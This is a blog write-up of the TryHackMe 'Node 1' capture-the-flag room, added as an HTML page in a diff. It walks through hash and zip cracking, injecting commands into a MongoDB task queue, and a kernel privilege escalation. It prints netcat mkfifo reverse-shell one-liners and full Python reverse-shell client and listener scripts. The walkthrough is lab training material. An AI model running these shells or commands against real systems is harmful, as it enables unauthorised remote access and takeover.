@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=e806947677a0c9998e0b50c958a96a3225f4a102">
+    <link rel="shortcut icon" type="image/png" href="http://localhost:4000/assets/images/shinris3n.png">
+
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Node 1 | 当て身 Atemi</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Node 1" />
+<meta name="author" content="shinris3n" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="A Cybersecurity blog by shinris3n 👊 Writeups 👊 News 👊 Resources" />
+<meta property="og:description" content="A Cybersecurity blog by shinris3n 👊 Writeups 👊 News 👊 Resources" />
+<link rel="canonical" href="http://localhost:4000/writeups/2020/04/17/TryHackMe-Node1.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/2020/04/17/TryHackMe-Node1.html" />
+<meta property="og:site_name" content="当て身 Atemi" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-04-17T00:13:21-04:00" />
+<script type="application/ld+json">
+{"url":"http://localhost:4000/writeups/2020/04/17/TryHackMe-Node1.html","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2020/04/17/TryHackMe-Node1.html"},"author":{"@type":"Person","name":"shinris3n"},"headline":"Node 1","description":"A Cybersecurity blog by shinris3n 👊 Writeups 👊 News 👊 Resources","datePublished":"2020-04-17T00:13:21-04:00","dateModified":"2020-04-17T00:13:21-04:00","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1><a href = '/' style = "text-decoration:none;color:#b5e853;" >当て身 Atemi</a></h1>
+        <h2>A Cybersecurity blog by shinris3n <br> 👊 <a href = "/writeups">Writeups</a> 👊 <a href = "/news">News</a> 👊 <a href = "/resources">Resources</a> <br></h2>
+        <h5>Part of the <a href="https://www.ninpwn.com" target="_blank">Ninpwn</a> Network</h5>
+      </div>
+    </header>
+
+    <div class="container">
+      <img src="http://localhost:4000/assets/images/shinris3n_banner_transparent.png" width="25%" height="25%" alt="shinris3n" title="shinris3n">
+      <section id="main_content">
+        <h5><a href="#" onclick="history.go(-1)"> &lt;&lt; back </a></h5><br>
+
+
+<small>17 April 2020</small>
+<h1>Node 1</h1>
+
+
+
+
+ <small><font color="b5e853">Challenge Source: <em>TryHackMe</em></font></small>
+
+<br>
+
+  <small><font color="b5e853">Challenge Category: <em>boot2root</em></font></small>
+
+
+<p><a href="https://tryhackme.com/" target="_blank"><img src="/assets/writeups/TryHackMe/THMlogo.png" width="225" /></a></p>
+
+<ul>
+  <li>First, we start out with some basic enumeration:</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>nmap <span class="nt">-A</span> 10.10.123.120</code></pre></figure>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-1.png" alt="Nmap Output" /></p>
+
+<ul>
+  <li>
+    <p>We find that SSH is open as well as port 3000.</p>
+  </li>
+  <li>
+    <p>Inspection of the source code for website hosted at 10.10.123.120:3000 reveals some interesting script names:</p>
+  </li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-2.png" alt="Website Sourcecode" /></p>
+
+<ul>
+  <li>In particular, home.js reveals an internal path, which we’re able to access via the browser.</li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-3.png" alt="Website Path 1" />
+<img src="/assets/writeups/TryHackMe/Node1/14-4.png" alt="Website Path 2" /></p>
+
+<ul>
+  <li>Shaving off a bit of this path reveals an admin account as well:</li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-5.png" alt="Website Path 2" /></p>
+
+<ul>
+  <li>Next, we can use hash-identifier to determine that this probably SHA-256:</li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-6.png" alt="Hash-Identifier" /></p>
+
+<ul>
+  <li>Then we can proceed to use hashcat to try to crack the admin account (1400 corresponds to SHA-256).</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">hashcat <span class="nt">-m</span> 1400 <span class="nt">-a</span> 0 crackthispw.txt /usr/share/wordlists/rockyou.txt <span class="nt">--force</span></code></pre></figure>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-7.png" alt="Hashcat 1" />
+<img src="/assets/writeups/TryHackMe/Node1/14-8.png" alt="Hashcat 2" /></p>
+
+<ul>
+  <li>We can now go back to the main page and log in with these credentials.</li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-9.png" alt="Admin Login" /></p>
+
+<ul>
+  <li>Checking out the file that we can download after logging in, it looks to be encoded.</li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-10.png" alt="Encoded File" /></p>
+
+<ul>
+  <li>Throwing the file up on CyberChef and using the Magic function with defaults reveals that this was a B64 encoded zip file.</li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-11.png" alt="CyberChef" /></p>
+
+<ul>
+  <li>You can then click to load the recipe as noted in the first output field and download the result, renaming it as filename.zip. However, as Zeddicus Zu’l Zorander once said: “Nothing is ever easy.” - the zip is also password protected.</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">fcrackzip <span class="nt">-v</span> <span class="nt">-D</span> <span class="nt">-u</span> <span class="nt">-p</span> <span class="s1">'/usr/share/wordlists/rockyou.txt'</span> myplacebackup_decoded.zip</code></pre></figure>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-12.png" alt="Fcrackzip Output" /></p>
+
+<ul>
+  <li>Ok, well maybe that <em>was</em> easy, but there’s a lot more to go still. Now we can dig through the files. We find some fantastic artwork in app.js…</li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-13.png" alt="Trololol" /></p>
+
+<ul>
+  <li>…but don’t let that distract us from the user mark’s mongodb credentials in plaintext on top.</li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-14.png" alt="Credentials" /></p>
+
+<ul>
+  <li>
+    <p>As it turns out, these are also the SSH credentials for mark. This password is actually the TryHackMe user flag too, even though you’ll find a file called user.txt in the user tom’s directory upon logging in as mark.</p>
+  </li>
+  <li>
+    <p>Once inside, checking out the processes reveals that tom is running that app.js file using the binary /usr/bin/node from two spots: /var/www (which is the path we had the backup file for), but also /var/scheduler. The version of this in /var/scheduler is really interesting, however.</p>
+  </li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-15.png" alt="PS Output" /></p>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-16.png" alt="Scheduler" /></p>
+
+<ul>
+  <li>
+    <p>It appears that this version of app.js connects to the database, reads from ‘tasks’, executes whatever command is there, then deletes the entry, on a 30 second cycle.</p>
+  </li>
+  <li>
+    <p>We now need to figure out the syntax needed to actually make a connection to the database with the intent of adding a task that opens up a shell to our machine. It seems like it should be as simple as using the contents of the url variable, but authMechanism actually needs to be removed for this to work correctly.</p>
+  </li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">mongo mongodb://mark:markspw@localhost:27017/scheduler?authSource<span class="o">=</span>scheduler</code></pre></figure>
+
+<ul>
+  <li>
+    <p>Before we go further, we can grab some code <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">here</a> for a reverse shell.</p>
+  </li>
+  <li>
+    <p>One strategy is to add a command that runs netcat, since that is actually installed on the target machine. As information in the link above provides, since the target machine doesn’t allow the -e flag, we have to use the syntax:</p>
+  </li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">‘rm /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.0.0.1 1234 <span class="o">&gt;</span>/tmp/f’</code></pre></figure>
+
+<ul>
+  <li>
+    <p>Another approach, if we don’t want to rely on netcat being available, is to use a pair of Python scripts as found <a href="https://github.com/trackmastersteve/shell" target="_blank">here</a>.</p>
+  </li>
+  <li>
+    <p>This code goes on the target machine in the /tmp directory:</p>
+  </li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">'10.11.3.185'</span> <span class="c1"># The ip of the listener.
+</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">2468</span> <span class="c1"># The same port as listener.
+</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span> <span class="c1"># Connect to listener.
+</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"[*] Connection Established!"</span><span class="p">))</span> <span class="c1"># Send connection confirmation.
+</span>
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># Start loop.
+</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"UTF-8"</span><span class="p">)</span> <span class="c1"># Recieve shell command.
+</span><span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="s">"quit"</span><span class="p">:</span>
+<span class="k">break</span> <span class="c1"># If it's quit, then break out and close socket.
+</span><span class="k">if</span> <span class="n">data</span><span class="p">[:</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="s">"cd"</span><span class="p">:</span>
+<span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">:])</span> <span class="c1"># If it's cd, change directory.
+# Run shell command.
+</span><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+<span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+<span class="n">stdout_value</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="o">+</span> <span class="n">proc</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="c1"># Read output.
+</span><span class="n">output_str</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">stdout_value</span><span class="p">,</span> <span class="s">"UTF-8"</span><span class="p">)</span> <span class="c1"># Format output.
+</span><span class="n">currentWD</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">()</span> <span class="o">+</span> <span class="s">"&gt; "</span> <span class="c1"># Get current working directory.
+</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">currentWD</span> <span class="o">+</span> <span class="n">output_str</span><span class="p">))</span> <span class="c1"># Send output to listener.
+</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span> <span class="c1"># Close socket.</span></code></pre></figure>
+
+<ul>
+  <li>This code goes on your machine:</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">''</span> <span class="c1"># '' means bind to all interfaces.
+</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">2468</span> <span class="c1"># Port.
+</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="c1"># Create our socket handler.
+</span><span class="n">s</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="c1"># Set is so that when we cancel out we can reuse port.
+</span><span class="k">try</span><span class="p">:</span>
+<span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span> <span class="c1"># Bind to interface.
+</span><span class="k">print</span><span class="p">(</span><span class="s">"[*] Listening on 0.0.0.0:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">PORT</span><span class="p">))</span> <span class="c1"># Print we are accepting connections.
+</span><span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="c1"># Listen for only 10 unaccepted connections.
+</span><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span> <span class="c1"># Accept connections.
+</span><span class="k">print</span><span class="p">(</span><span class="s">"[+] Connected by"</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span> <span class="c1"># Print connected by ipaddress.
+</span><span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"UTF-8"</span><span class="p">)</span> <span class="c1"># Receive initial connection.
+</span><span class="k">while</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># Start loop.
+</span><span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"target_machine&gt; "</span><span class="p">)</span> <span class="c1"># Enter shell command.
+</span><span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">"UTF-8"</span><span class="p">))</span> <span class="c1"># Send shell command.
+</span><span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="s">"quit"</span><span class="p">:</span>
+<span class="k">break</span> <span class="c1"># If we specify quit then break out of loop and close socket.
+</span><span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"UTF-8"</span><span class="p">)</span> <span class="c1"># Receive output from command.
+</span><span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="c1"># Print the output of the command.
+</span><span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"...listener terminated using [ctrl+c], Shutting down!"</span><span class="p">)</span>
+<span class="nb">exit</span><span class="p">()</span> <span class="c1"># Using [ctrl+c] will terminate the listener.
+</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span> <span class="c1"># Close socket.</span></code></pre></figure>
+
+<ul>
+  <li>As a test before using it as a payload to run as the user tom, we can try this using mark’s account first.</li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-17.png" alt="Python sender" />
+<img src="/assets/writeups/TryHackMe/Node1/14-18.png" alt="Python listener" /></p>
+
+<ul>
+  <li>Now we can try to run this by modifying the mongo db task list. We need to make sure to run the listener on our machine first else we might miss that 30 second window.</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">db.tasks.insert<span class="o">({</span> <span class="s2">"cmd"</span>: “python3 /tmp/sayhello.py” <span class="o">})</span><span class="p">;</span></code></pre></figure>
+
+<ul>
+  <li>Note: syntax errors may show up due to non-printable characters depending on where you copy/paste code from.  Try to manually enter the command if this happens.</li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-19.png" alt="Python sender executed" />
+<img src="/assets/writeups/TryHackMe/Node1/14-20.png" alt="Python listener executed" /></p>
+
+<ul>
+  <li>If you want to use the netcat method since it is available to us (and it is admittedly cleaner and less buggy while poking around), you can enter:</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">db.tasks.insert<span class="o">({</span> <span class="s2">"cmd"</span>: <span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.3.185 2468 &gt;/tmp/f"</span> <span class="o">})</span><span class="p">;</span></code></pre></figure>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-21.png" alt="Netcat sender executed" />
+<img src="/assets/writeups/TryHackMe/Node1/14-22.png" alt="Netcat listener executed" /></p>
+
+<ul>
+  <li>Either way, we wind up with this piece of information after getting done with all the other rabbit holes:</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">uname</span> <span class="nt">-a</span></code></pre></figure>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-23.png" alt="uname -a" /></p>
+
+<ul>
+  <li>Using searchsploit, we can find some privilege escalation scripts for this kernel version.  Note: 41457 doesn’t seem to work correctly and causes the target to hang up, but 44298 works with no problems.</li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-24.png" alt="Searchsploit Output" /></p>
+
+<ul>
+  <li>We can copy the source over and build it. (Sublime Text 3 was used in the image below).</li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-25.png" alt="Exploit Build" /></p>
+
+<ul>
+  <li>Then we can set up a local web server to make it easy to grab the compiled exploit.</li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-26.png" alt="Webserver" /></p>
+
+<ul>
+  <li>We cd into the tmp directory again, download the exploit, change the permissions appropriately, execute the binary to get root and cd into the /root directory to <em>finally</em> find the flag. Whew!</li>
+</ul>
+
+<p><img src="/assets/writeups/TryHackMe/Node1/14-26.png" alt="Root Flag" /></p>
+
+<p>This was a fun, educational and challenging room; totally worth pushing through to complete.</p>
+
+
+
+  <small>Tags: <em>TryHackMe</em></small>
+
+
+      </section>
+    </div>
+
+    
+  </body>
+</html>
